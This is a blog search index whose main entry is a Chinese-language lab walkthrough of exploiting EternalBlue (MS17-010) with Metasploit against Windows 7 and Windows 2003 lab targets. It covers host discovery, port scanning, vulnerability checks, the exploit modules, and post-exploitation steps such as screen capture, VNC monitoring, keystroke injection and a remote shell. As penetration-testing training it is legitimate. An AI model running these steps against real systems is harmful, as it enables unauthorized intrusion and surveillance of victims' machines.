<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>测试</title>
    <link href="/2023/09/17/%E6%B5%8B%E8%AF%95/"/>
    <url>/2023/09/17/%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>:勾八hzy</p><p><img src="/%E6%B5%8B%E8%AF%95/image-20230917134740713.png" alt="image-20230917134740713"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝</title>
    <link href="/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <url>/2023/09/17/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="永恒之蓝："><a href="#永恒之蓝：" class="headerlink" title="永恒之蓝："></a>永恒之蓝：</h1><h2 id="window7："><a href="#window7：" class="headerlink" title="window7："></a>window7：</h2><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">永恒之蓝是在Windows的SMB服务处理SMB <span class="hljs-built_in">v1</span>请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放<span class="hljs-number">445</span>文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序<br></code></pre></td></tr></table></figure><h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><h3 id="攻击机："><a href="#攻击机：" class="headerlink" title="攻击机："></a>攻击机：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kali</span>： <span class="hljs-number">192.168.190.130</span><br></code></pre></td></tr></table></figure><h3 id="目标靶机："><a href="#目标靶机：" class="headerlink" title="目标靶机："></a>目标靶机：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">window</span> <span class="hljs-number">7</span> <span class="hljs-number">32</span>位：<span class="hljs-number">192.168.190.170</span>  //<span class="hljs-number">32</span>位和<span class="hljs-number">64</span>位的靶机所使用的一些参数不一样 需要目标的防火墙和杀毒软件关闭<br></code></pre></td></tr></table></figure><h3 id="使用工具："><a href="#使用工具：" class="headerlink" title="使用工具："></a>使用工具：</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></table></figure><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><h3 id="使用arp-sweep扫描存活主机："><a href="#使用arp-sweep扫描存活主机：" class="headerlink" title="使用arp_sweep扫描存活主机："></a>使用arp_sweep扫描存活主机：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">开启msf，使用msf的辅助模块auxiliary的arp_sweep<br>use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep<br></code></pre></td></tr></table></figure><p>进行存活主机的扫描：</p><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916091642313.png" alt="image-20230916091642313"></p><p>通过show options 命令来查看该模块所需要的参数：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">show</span> options  //发现在RHOSTS需要使用<span class="hljs-literal">yes</span>，此处需要我们设置网段<span class="hljs-number">192.168.190.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916091731803.png" alt="image-20230916091731803"></p><p>通过set rhosts来设置需要扫描的网段：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> rhosts <span class="hljs-number">192.168</span><span class="hljs-number">.190</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>     //大小写不区分，设置完后，有需要的话可以通过<span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span> 来查看参数是否设置成功<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916092117973.png" alt="image-20230916092117973"></p><p>接下来通过run命令来运行该模块：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">run     <span class="hljs-comment">//exploit命令也可以</span><br>可以看到扫描到了<span class="hljs-number">130</span>和<span class="hljs-number">174</span>，两个ip，其中<span class="hljs-number">130</span>是kali的，<span class="hljs-number">174</span>是目标靶机的<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916110944440.png" alt="image-20230916110944440"></p><h3 id="使用portscan扫描开放的端口："><a href="#使用portscan扫描开放的端口：" class="headerlink" title="使用portscan扫描开放的端口："></a>使用portscan扫描开放的端口：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>portscan<span class="hljs-regexp">/tcp  /</span><span class="hljs-regexp">/同时使用show options来查看该模块需要的参数（rhosts）ip</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916093447957.png" alt="image-20230916093447957"></p><p>通过set rhosts来设置目标靶机ip：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111055385.png" alt="image-20230916111055385"></p><p>通过run命令来执行该模块扫描端口：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">run   <span class="hljs-regexp">//</span>扫到目标靶机开放的端口为：<span class="hljs-number">135</span> <span class="hljs-number">139</span> <span class="hljs-number">445</span> <span class="hljs-number">5357</span> <br><span class="hljs-regexp">//</span>特别是这个<span class="hljs-number">445</span>端口，是利用永恒之蓝的重点<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111149189.png" alt="image-20230916111149189"></p><p>发现目标靶机开放了445端口，为接下来的攻击提供了基础，在msf中search永恒之蓝的模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">search ms17_010  <span class="hljs-regexp">//m</span>s17_010为永恒之蓝的漏洞名称<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916105533668.png" alt="image-20230916105533668"></p><h3 id="通过利用smb-ms17-010模块："><a href="#通过利用smb-ms17-010模块：" class="headerlink" title="通过利用smb_ms17_010模块："></a>通过利用smb_ms17_010模块：</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">该模块是用来探查目标靶机是否存在永恒之蓝该漏洞<br>将rhosts 处改为目标靶机ip<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111255766.png" alt="image-20230916111255766"></p><p>接下来直接run：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">run   <span class="hljs-comment">//通过扫描结果得知目标靶机易受到ms17_010攻击</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916111437710.png" alt="image-20230916111437710"></p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="使用ms17的漏洞模块攻击靶机："><a href="#使用ms17的漏洞模块攻击靶机：" class="headerlink" title="使用ms17的漏洞模块攻击靶机："></a>使用ms17的漏洞模块攻击靶机：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">由于我们的目标靶机为<span class="hljs-number">32</span>位的（和<span class="hljs-number">64</span>位的攻击方式不太一样），所以我们应该提前下载一些配置，参考大佬博客：<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_41617034/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">91051614</span><br></code></pre></td></tr></table></figure><p>利用exp的攻击模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_eternalblue_32<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112113727.png" alt="image-20230916112113727"></p><p>通过show payloads命令查看payload模块：</p><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112314337.png" alt="image-20230916112314337"></p><p>set payload命令设置：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">同时在模块参数中，PROCESSINJECT和RHOSTS都需要设置，<span class="hljs-number">32</span>位的PROCESSINJECT的参数设置为：explorer.exe<br>RHOSTS设置目标靶机：<span class="hljs-number">192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112438945.png" alt="image-20230916112438945"></p><p>设置PROCESSINJECT的参数和RHOSTS的参数：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> processinject <span class="hljs-comment">explorer.exe</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.190.174</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916112708775.png" alt="image-20230916112708775"></p><p>接下来尝试run：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">可以看到攻击成功，拿下了wi<span class="hljs-symbol">ndows7</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916113157528.png" alt="image-20230916113157528"></p><h3 id="入侵后可以干的一些事情："><a href="#入侵后可以干的一些事情：" class="headerlink" title="入侵后可以干的一些事情："></a>入侵后可以干的一些事情：</h3><p>尝试一些命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">screenshot 屏幕截图  <span class="hljs-regexp">//</span>将win7的屏幕截图并且保持到kali的用户目录下<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916113301165.png" alt="image-20230916113301165"></p><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916113341578.png" alt="image-20230916113341578"></p><p>成功入侵靶机电脑，你就可以干一些你想干点事情：</p><p>such as ：</p><p>监控对方电脑屏幕：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> vnc -i <br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916114409908.png" alt="image-20230916114409908"></p><p>回车切换到会话端：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>生成的这个屏幕监控会放一边<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916114705026.png" alt="image-20230916114705026"></p><p>可以通过keyboard_send命令发送你想发送的信息：</p><p>先打开记事本，然后通过keyboard_send来发送想要发送的信息：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">execute -f notepad<br>keyboard_send nihao!!!<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916115004580.png" alt="image-20230916115004580"></p><p>切换到测试的wind7靶机：</p><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916115124362.png" alt="image-20230916115124362"></p><p>监控页面：</p><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916115137069.png" alt="image-20230916115137069"></p><p>想要干更多的事情可以参考另一个大佬的博客：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/yuanyuzhou/</span>p/<span class="hljs-number">16118409</span>.html<br></code></pre></td></tr></table></figure><p>以上的操作均是在合法的环境中进行！</p><h2 id="续接：windows-2003："><a href="#续接：windows-2003：" class="headerlink" title="续接：windows 2003："></a>续接：windows 2003：</h2><h3 id="测试环境：-1"><a href="#测试环境：-1" class="headerlink" title="测试环境："></a>测试环境：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows</span> <span class="hljs-number">2003</span> <span class="hljs-number">32</span>位<br></code></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>arp_sweep扫描目标存活主机;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep<br>run<br><span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">190.167</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916122820816.png" alt="image-20230916122820816"></p><p>portscan&#x2F;tcp模块扫描目标靶机开放的端口：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp<br>set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">190.167</span><br>run<br><span class="hljs-regexp">//</span>可以看到该靶机开放了<span class="hljs-number">445</span>端口<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916123020511.png" alt="image-20230916123020511"></p><p>利用检查是否存在利用漏洞的模块来检测目标靶机：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_ms17_010<br>set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">190.167</span><br>show options<br><span class="hljs-regexp">//</span>可以看到win2003存在该漏洞<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916123158801.png" alt="image-20230916123158801"></p><h2 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">尝试使用针对2007的漏洞脚本模块，发现不行<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124005735.png" alt="image-20230916124005735"></p><p>通过查询，发现，另一个漏洞模块可以利用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_psexec<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124113496.png" alt="image-20230916124113496"></p><p>该模块设置好目标靶机：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">即可攻击 /<span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124143136.png" alt="image-20230916124143136"></p><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124203548.png" alt="image-20230916124203548"></p><p>可以通过shell命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">shell  <span class="hljs-regexp">//</span>进入到目标靶机的终端<br>chcp <span class="hljs-number">56001</span> 改变当前会话的编码格式，减少乱码的出现<br></code></pre></td></tr></table></figure><p><img src="/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20230916124302179.png" alt="image-20230916124302179"></p><p>大部分功能可以照常使用</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
